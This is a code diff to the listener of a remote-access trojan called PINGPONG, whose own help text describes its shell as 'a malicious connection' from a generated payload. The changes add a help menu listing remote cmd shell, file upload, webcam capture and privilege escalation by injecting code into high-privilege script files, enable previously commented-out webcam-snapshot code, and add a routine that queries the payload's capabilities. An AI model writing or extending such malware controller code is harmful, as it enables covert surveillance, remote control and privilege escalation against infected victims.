@@ -51,7 +51,6 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
         except KeyboardInterrupt:
             main.print_normal("handler>[*]Stoping......")
             main.main()
-        import PINGPONG_script.upload
         _ip = addr[0]
         _port = addr[1]
         # PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
@@ -78,18 +77,36 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
         #     print("PINGPONG>[*]running " + AUTOCOMMAND)
         #     command = AUTOCOMMAND
         #     is_Auto = True
-        # if command == "cam_shot" or command == "CAM_SHOT":
-        #     import PINGPONG_script.camera
-        #     PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn)
-        #     try:
-        #         import cv2      
-        #         img = cv2.imread('shot.jpg',1)
-        #         cv2.imshow('imshow',img)
-        #         cv2.waitKey(0)
-        #         cv2.destroyAllWindows()
-        #     except:
-        #         print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
-        if command == "exit" or command == "EXIT":
+        if command == 'help' or command == 'HELP':
+            main.print_normal("""
+PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
+    usage:
+        the usage of the shell is set when you generate the payload
+        a PINGPONG payload must have those usage:
+            exit : exit the connection
+            help : for help
+            show_usage : print out the usage(s) the payload has
+            PING : check the connection. If it is good, return PONG
+            info : printout the ip and port of both the hosts
+        the below usage will be activate if u set it when u are generating the payload
+        if u have this usage, type command to use it:
+            cmd : make a cmd connection
+            upload : upload your file
+            cam_shot : take shot
+            priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
+            main.print_warn("PINGPONG>[!]type 'show usage' to print out all the activate usage")
+        elif command == "cam_shot" or command == "CAM_SHOT":
+            import PINGPONG_script.camera
+            PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn)
+            try:
+                import cv2      
+                img = cv2.imread('shot.jpg',1)
+                cv2.imshow('imshow',img)
+                cv2.waitKey(0)
+                cv2.destroyAllWindows()
+            except:
+                print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
+        elif command == "exit" or command == "EXIT":
             conn.send(bytes("EXIT_APP", 'utf8'))
             main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
             main.print_normal("handler>[*]Back to main console......")
@@ -101,6 +118,21 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
             if PINGPONG_script.priv_vbp_listen.priv_vbp_listen(PINGPONG_script.addsend, conn):
                 conn.close()
                 startserver(False, False, ip=ip, port=port)
+        elif command == 'show_usage' or command == 'SHOW_USAGE':
+            if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn):
+                conn.send(b'OK')
+                amount_of_usage = conn.recv(1024)
+                conn.send(b'OK')
+                i = 0
+                usage_list = []
+                while i <= int(amount_of_usage.decode('utf8')):
+                    usage = conn.recv(1024)
+                    usage_list.append(usage.decode('utf8'))
+                    conn.send(b'OK')
+                    i += 1
+                usage_list.pop()
+                main.print_normal(f'PINGPONG>[*]usage : {usage_list}')
+
         elif command == "cmd" or command == "CMD":
             import PINGPONG_script.cmdshell
             if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
